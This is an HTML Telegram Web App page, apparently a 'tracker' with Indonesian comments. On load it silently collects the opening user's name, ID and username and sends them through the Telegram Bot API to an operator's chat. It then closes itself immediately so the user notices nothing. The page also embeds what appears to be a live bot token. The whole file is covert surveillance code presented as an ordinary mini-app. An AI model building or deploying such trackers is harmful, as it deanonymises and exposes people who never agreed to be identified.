<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    </style>
</head>
<body>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe.user;
        const BOT_TOKEN = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
        const ADMIN_ID = 'MASUKKAN_ID_TELE_KAMU'; // <--- JANGAN LUPA GANTI INI

        if (user) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `🎯 **Tracker Terdeteksi!**\n\n👤 Nama: ${user.first_name}\n🆔 ID: \`${user.id}\`\n🔗 User: @${user.username || '-'}`,
                    parse_mode: "Markdown"
                })
            }).finally(() => {
                tg.close(); // Tutup otomatis dalam 0.1 detik
            });
        }
    </script>
</body>
</html>
